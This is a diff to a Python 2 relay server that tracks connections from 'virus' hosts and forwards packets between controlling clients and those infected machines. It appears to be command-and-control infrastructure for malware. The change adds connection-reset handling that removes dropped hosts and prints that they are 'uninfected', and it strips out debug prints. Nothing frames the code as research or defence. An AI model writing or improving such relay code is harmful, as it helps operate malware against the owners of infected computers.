@@ -4,6 +4,7 @@ from StringIO import StringIO
 import threading, time
 from packet import Packet
 from Queue import Queue
+import errno
 
 class RelayServer:
     def __init__(self):
@@ -63,14 +64,21 @@ class RelayServer:
         q = Queue()
         self.toVirus[address[0]] = (client,q)
         self.sendIPList()
-        threading.Thread(target=self.receiveFromVirus,args=[client]).start()
+        threading.Thread(target=self.receiveFromVirus,args=[client,address]).start()
         threading.Thread(target=self.dequeue,args=[q,client]).start()
 
-    def receiveFromVirus(self,s):
+    def receiveFromVirus(self,s,address):
         while True:
             pkt = Packet()
-            pkt.construct(s)
-            print "from virus: " + str(pkt)
+            try:
+                pkt.construct(s)
+            except socket.error as error:
+                if error.errno == errno.WSAECONNRESET:
+                    del self.toVirus[address[0]]
+                    print address[0] + " uninfected!"
+                    break
+                else:
+                    raise
             self.enqueueToClient(pkt)
 
 
@@ -85,8 +93,13 @@ class RelayServer:
     def receiveFromClient(self,s,address):
         while True:
             pkt = Packet()
-            pkt.construct(s)
-            print "from client: " + str(pkt)
+            try:
+                pkt.construct(s)
+            except socket.error as error:
+                if error.errno == errno.WSAECONNRESET:
+                    del self.toClient[address[0]]
+                else:
+                    raise
             pkt.returnIP = address[0]
             self.enqueueToVirus(pkt)
 
